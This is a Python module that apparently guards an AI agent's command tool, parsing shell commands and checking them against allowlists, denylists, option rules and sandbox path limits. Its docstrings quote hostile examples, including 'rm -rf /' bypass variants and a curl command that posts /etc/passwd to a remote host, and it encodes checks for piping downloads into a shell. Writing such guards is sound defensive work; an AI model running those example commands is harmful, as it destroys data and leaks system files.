"""Static analysis of ``run_command`` requests.

The old approach matched regexes against the raw command string, which is easy to
bypass (``r''m -rf /``, ``/bin/rm``, ``$(...)``). This module instead:

1. parses the string the way a shell would split it (quote- and escape-aware);
2. rejects anything that needs a shell (pipes, redirects, ``;``, ``&&``, ``$(...)``)
   because tools run *without* a shell and such syntax would only mislead;
3. judges each program by its normalised name against an allowlist, a denylist and
   per-program option rules;
4. checks every path-like argument stays inside the sandbox.

Anything it does not recognise is denied (fail closed).
"""

from __future__ import annotations

import fnmatch
import posixpath
import re
import shlex
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from .models import Decision, Limits, PolicyResult
from .paths import inspect_argument_path

URL_RE = re.compile(r"^([A-Za-z][A-Za-z0-9+.\-]*)://")
# curl/wget read local files through value syntax: -d @file, -F name=@file, -F name=<file, --data-urlencode name@file
FILE_REF_RE = re.compile(r"=[@<]")
OPERATOR_CHARS = frozenset("|&;<>()")


class CommandParseError(ValueError):
    """The command string cannot be split unambiguously."""


@dataclass(frozen=True)
class Segment:
    """One simple command (argv) between shell operators."""

    argv: list[str]


@dataclass(frozen=True)
class Operator:
    """A run of shell operator characters such as ``|``, ``&&``, ``>>`` or a newline."""

    text: str


@dataclass(frozen=True)
class ParsedCommand:
    pieces: list[Segment | Operator]
    has_substitution: bool

    @property
    def segments(self) -> list[Segment]:
        return [p for p in self.pieces if isinstance(p, Segment)]

    @property
    def operators(self) -> list[Operator]:
        return [p for p in self.pieces if isinstance(p, Operator)]


def parse_command(raw: str) -> ParsedCommand:
    """Split ``raw`` into simple commands and operators, honouring quotes and escapes."""
    pieces: list[Segment | Operator] = []
    buf: list[str] = []
    quote: str | None = None
    substitution = False
    n = len(raw)

    def flush() -> None:
        text = "".join(buf).strip()
        buf.clear()
        if not text:
            return
        try:
            argv = shlex.split(text)
        except ValueError as exc:
            raise CommandParseError(str(exc)) from exc
        if argv:
            pieces.append(Segment(argv))

    i = 0
    while i < n:
        ch = raw[i]
        if quote == "'":
            buf.append(ch)
            if ch == "'":
                quote = None
        elif quote == '"':
            if ch == "\\" and i + 1 < n:
                buf.append(ch)
                buf.append(raw[i + 1])
                i += 1
            else:
                if ch == "`" or raw.startswith("$(", i):
                    substitution = True
                buf.append(ch)
                if ch == '"':
                    quote = None
        else:
            if ch == "\\" and i + 1 < n:
                buf.append(ch)
                buf.append(raw[i + 1])
                i += 1
            elif ch in ("'", '"'):
                quote = ch
                buf.append(ch)
            elif ch == "`" or raw.startswith("$(", i):
                substitution = True
                buf.append(ch)
            elif ch in OPERATOR_CHARS or ch == "\n":
                flush()
                j = i
                while j < n and (raw[j] in OPERATOR_CHARS or raw[j] == "\n"):
                    j += 1
                pieces.append(Operator(raw[i:j].replace("\n", "\\n")))
                i = j - 1
            else:
                buf.append(ch)
        i += 1

    if quote is not None:
        raise CommandParseError("unterminated quote")
    flush()
    return ParsedCommand(pieces, substitution)


def _deny(rule_id: str, reason: str, **details: Any) -> PolicyResult:
    return PolicyResult(Decision.DENY, reason, rule_id, details)


class CommandPolicy:
    """Evaluates a command string against the ``commands:`` section of the policy."""

    def __init__(
        self,
        config: dict[str, Any],
        sandbox_root: Path,
        allowed_verdict: Decision,
        limits: Limits,
    ) -> None:
        self.sandbox_root = sandbox_root
        self.allowed_verdict = allowed_verdict
        self.limits = limits
        self.unknown_verdict = Decision(config.get("unknown_program", "deny"))
        self.allowed = [p.lower() for p in config.get("allowed_programs", [])]
        self.downloaders = {p.lower() for p in config.get("downloaders", [])}
        self.shells = {p.lower() for p in config.get("shells", [])}
        self.subcommands = {k.lower(): list(v) for k, v in config.get("subcommands", {}).items()}
        self.denied_rules = config.get("denied_programs", [])
        self.option_rules = config.get("forbidden_options", [])
        self.system_paths = [posixpath.normpath(p) for p in config.get("system_paths", [])]
        self.url_schemes = {s.lower() for s in config.get("allowed_url_schemes", [])}

    # ------------------------------------------------------------------ entry point

    def evaluate(self, command: str) -> PolicyResult:
        if not command.strip():
            return _deny("empty-command", "empty command")
        if len(command) > self.limits.max_command_length:
            return _deny("command-too-long", f"command longer than {self.limits.max_command_length} characters")
        for ch in command:
            if ch not in "\t\n" and not ch.isprintable():
                return _deny("control-characters", f"command contains a non-printable character (U+{ord(ch):04X})")

        try:
            parsed = parse_command(command)
        except CommandParseError as exc:
            return _deny("unparseable-command", f"cannot parse command: {exc}")

        if parsed.has_substitution:
            return _deny("command-substitution", "command substitution ($(...) or backticks) is not supported")
        if not parsed.segments:
            return _deny("empty-command", "command has no program")

        for check in (self._check_pipe_to_shell, self._check_system_redirect):
            result = check(parsed)
            if result:
                return result

        redirect_targets = self._redirect_target_indexes(parsed)
        unknown: list[str] = []
        for index, segment in enumerate(parsed.segments):
            if index in redirect_targets:
                continue
            result, is_unknown = self._check_segment(segment.argv)
            if result:
                return result
            if is_unknown:
                unknown.append(self._program(segment.argv))

        if parsed.operators:
            ops = " ".join(op.text for op in parsed.operators)
            return _deny(
                "shell-operator",
                f"shell operators are not supported ({ops}); send one simple command at a time",
            )

        argv = parsed.segments[0].argv
        if unknown:
            return PolicyResult(
                self.unknown_verdict,
                f"program '{unknown[0]}' is not on the allowlist",
                "unknown-program",
                {"argv": argv},
            )
        return PolicyResult(
            self.allowed_verdict,
            f"program '{self._program(argv)}' is allowlisted; command is '{self.allowed_verdict.value}' by policy",
            "run_command-default",
            {"argv": argv},
        )

    # ------------------------------------------------------------------ pipeline rules

    @staticmethod
    def _program(argv: list[str]) -> str:
        """Normalised program name used for all matching (case-folded)."""
        return argv[0].lower()

    def _check_pipe_to_shell(self, parsed: ParsedCommand) -> PolicyResult | None:
        if not any("|" in op.text.replace("||", "") for op in parsed.operators):
            return None
        segments = parsed.segments
        for i, first in enumerate(segments):
            if posixpath.basename(self._program(first.argv)) not in self.downloaders:
                continue
            for later in segments[i + 1 :]:
                if any(posixpath.basename(tok.lower()) in self.shells for tok in later.argv[:4]):
                    return _deny("pipe-remote-to-shell", "dangerous command (pipes remote script into a shell)")
        return None

    def _redirect_target_indexes(self, parsed: ParsedCommand) -> set[int]:
        """Indexes (into ``parsed.segments``) of segments that are really redirect file names."""
        targets: set[int] = set()
        seg_index = -1
        for i, piece in enumerate(parsed.pieces):
            if isinstance(piece, Segment):
                seg_index += 1
            elif (
                ("<" in piece.text or ">" in piece.text)
                and i + 1 < len(parsed.pieces)
                and isinstance(parsed.pieces[i + 1], Segment)
            ):
                targets.add(seg_index + 1)
        return targets

    def _check_system_redirect(self, parsed: ParsedCommand) -> PolicyResult | None:
        for i, piece in enumerate(parsed.pieces):
            if not isinstance(piece, Operator) or ">" not in piece.text:
                continue
            if i + 1 < len(parsed.pieces) and isinstance(parsed.pieces[i + 1], Segment):
                target = parsed.pieces[i + 1].argv[0]
                if self._is_system_path(target):
                    return _deny("write-system-file", f"dangerous command (writes to a system file: {target})")
        return None

    # ------------------------------------------------------------------ per-program rules

    def _check_segment(self, argv: list[str]) -> tuple[PolicyResult | None, bool]:
        """Return (deny result or None, program-is-unknown)."""
        prog = self._program(argv)
        if "/" in prog:
            return _deny("program-path", "run programs by name only; path-qualified programs are not allowed"), False

        for rule in self.denied_rules:
            if any(fnmatch.fnmatchcase(prog, pat.lower()) for pat in rule["names"]):
                return _deny(rule["id"], f"dangerous command ({rule['reason']})"), False
        if prog in self.shells:
            return _deny("shell-interpreter", "dangerous command (shells can run arbitrary command strings)"), False

        for rule in self.option_rules:
            matches_program = any(fnmatch.fnmatchcase(prog, pat.lower()) for pat in rule["programs"])
            if matches_program and self._has_option(argv[1:], rule):
                return _deny(rule["id"], f"dangerous command ({rule['reason']})"), False

        known = any(fnmatch.fnmatchcase(prog, pat) for pat in self.allowed)
        if not known and self.unknown_verdict is Decision.DENY:
            return _deny("unknown-program", f"program '{prog}' is not on the allowlist"), True
        # unknown_program: ask -> keep checking arguments, ask the human at the end.

        allowed_subs = self.subcommands.get(prog)
        if allowed_subs is not None and len(argv) > 1 and argv[1] not in allowed_subs:
            return _deny(
                "subcommand-not-allowed",
                f"'{prog} {argv[1]}' is not allowed (allowed: {', '.join(allowed_subs)})",
            ), False

        for index, arg in enumerate(argv[1:]):
            previous = argv[index] if index > 0 else ""
            result = self._check_arg(arg)
            if result is None and prog in self.downloaders:
                result = self._check_file_reference(prog, arg, previous)
            if result:
                return result, False
        return None, not known

    @staticmethod
    def _has_option(args: list[str], rule: dict[str, Any]) -> bool:
        shorts = set(rule.get("short", []))
        longs = set(rule.get("long", []))
        for arg in args:
            if arg == "--":
                break
            if arg.startswith("--"):
                if arg.split("=", 1)[0] in longs:
                    return True
            elif arg.startswith("-") and len(arg) > 1 and shorts & set(arg[1:]):
                return True
        return False

    # ------------------------------------------------------------------ argument rules

    def _check_arg(self, arg: str) -> PolicyResult | None:
        candidates = [arg]
        if "=" in arg:
            candidates.append(arg.split("=", 1)[1])
        if arg.startswith("-") and not arg.startswith("--") and len(arg) > 2:
            candidates.append(arg[2:])  # glued short option, e.g. -o/etc/x
        for value in candidates:
            result = self._check_value(value)
            if result:
                return result
        return None

    def _check_value(self, value: str) -> PolicyResult | None:
        """Check one candidate value.

        Every value is treated as a possible sandbox-relative path, bare names included: the
        guard cannot tell ``cat link`` (a file) from ``echo link`` (a word), and the cost of
        guessing wrong is reading or overwriting a file outside the sandbox. A value is
        therefore resolved against the sandbox exactly as the kernel would, and refused if it
        escapes the sandbox or passes through any symlink. URLs (http/https) are the only
        values that are not paths. Plain words that do not name an existing file simply pass.
        """
        match = URL_RE.match(value)
        if match:
            scheme = match.group(1).lower()
            if scheme not in self.url_schemes:
                return _deny("bad-url-scheme", f"URL scheme '{scheme}://' is not allowed")
            return None

        if not value:
            return None
        if value.startswith("~"):
            return _deny("argument-outside-sandbox", f"home-directory reference is not allowed: {value}")
        if self._is_system_path(value):
            return _deny("system-path", f"dangerous command (touches a system path: {value})")
        if posixpath.isabs(value):
            return _deny("argument-outside-sandbox", f"absolute paths are not allowed: {value}")

        problem = inspect_argument_path(self.sandbox_root, value)
        if problem is None:
            return None
        kind, part = problem
        if kind == "symlink":
            return _deny("symlink-argument", f"argument passes through a symlink ({part}): {value}")
        return _deny("argument-outside-sandbox", f"path argument escapes the sandbox: {value}")

    def _check_file_reference(self, prog: str, arg: str, previous: str) -> PolicyResult | None:
        """Deny curl/wget ``@file`` style references that point outside the sandbox or through a symlink.

        ``curl --data-binary @/etc/passwd https://host`` reads a local file named *inside* the
        value, which the plain argument check cannot see. The referenced path gets the same
        treatment as any other argument. A reference to an ordinary file inside the sandbox
        stays allowed (and, like every curl, needs approval): see "exfiltration" in
        THREAT_MODEL.md.
        """
        if arg.startswith("--"):
            option, _, value = arg.partition("=")
        elif arg.startswith("-"):
            option, value = arg[:2], arg[2:]  # glued short option: -d@file
        else:
            option, value = previous, arg

        reference: str | None = None
        if value.startswith("@"):
            reference = value[1:]
        else:
            found = FILE_REF_RE.search(value)
            if found:
                reference = value[found.end() :]
            elif option == "--data-urlencode" and "@" in value:
                reference = value.split("@", 1)[1]  # name@file
        if reference is None:
            return None

        reference = reference.split(";", 1)[0].strip("\"'")  # -F 'f=@"a b.txt";type=text/plain'
        if not reference or reference == "-":
            return None
        denied = self._check_value(reference)
        if denied:
            return _deny(
                "file-reference",
                f"dangerous command ({prog} reads a file through @file syntax: {denied.reason})",
            )
        return None

    def _is_system_path(self, value: str) -> bool:
        if not posixpath.isabs(value):
            return False
        norm = posixpath.normpath(value)
        if norm in ("/", "//"):
            return True
        return any(norm == p or norm.startswith(p + "/") for p in self.system_paths)
